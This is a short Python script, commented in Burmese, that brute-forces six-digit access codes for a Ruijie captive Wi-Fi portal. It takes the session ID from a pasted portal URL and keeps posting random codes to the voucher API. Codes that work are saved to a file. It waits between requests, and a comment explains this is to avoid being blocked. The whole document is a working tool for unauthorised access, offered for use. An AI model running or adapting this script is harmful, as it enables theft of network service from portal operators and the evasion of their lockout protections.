import requests
import random
import time
import re
from urllib.parse import urlparse

# UI Colors
G = '\033[92m'
R = '\033[91m'
C = '\033[96m'
Y = '\033[93m'
W = '\033[0m'

def start_manual_brute():
    print(f"{C}[*] Ruijie Brute Force Engine (Manual Mode){W}")
    # Browser ထဲက Portal URL တစ်ခုလုံးကို ဒီမှာ Paste လုပ်ခိုင်းပါမယ်
    url = input(f"{Y}Paste Portal URL: {W}").strip()
    
    try:
        # URL ထဲက sessionId နဲ့ API endpoint ကို ထုတ်ယူခြင်း
        sid = re.search(r'sessionId=([a-zA-Z0-9_\-]+)', url).group(1)
        parsed = urlparse(url)
        api_url = f"{parsed.scheme}://{parsed.netloc}/api/auth/voucher/"
        
        print(f"{G}[+] Session ID Detected: {sid[:10]}...{W}")
        print(f"{G}[+] API Ready: {api_url}{W}")
        
        while True:
            # 6-Digit Brute Force
            code = "".join([str(random.randint(0, 9)) for _ in range(6)])
            
            payload = {"accessCode": code, "sessionId": sid, "apiVersion": 1}
            headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}
            
            try:
                res = requests.post(api_url, json=payload, headers=headers, timeout=5)
                if res.status_code == 200:
                    print(f"\n{G}[✅] WORKING CODE FOUND: {code}{W}")
                    with open("found.txt", "a") as f: f.write(code + "\n")
                    # အင်တာနက် ပွင့်မပွင့် Browser မှာ ချက်ချင်းစမ်းပါ
                else:
                    print(f"{W}[*] Testing: {code} {R}[Invalid]{W}", end="\r")
                
                # Block မခံရအောင် Delay ထည့်ပါ (အရေးကြီးသည်)
                time.sleep(1.5)
            except:
                print(f"\n{R}[!] Request Error. Waiting...{W}")
                time.sleep(5)
                
    except Exception as e:
        print(f"{R}[!] Error parsing URL: {e}{W}")

if __name__ == "__main__":
    start_manual_brute()
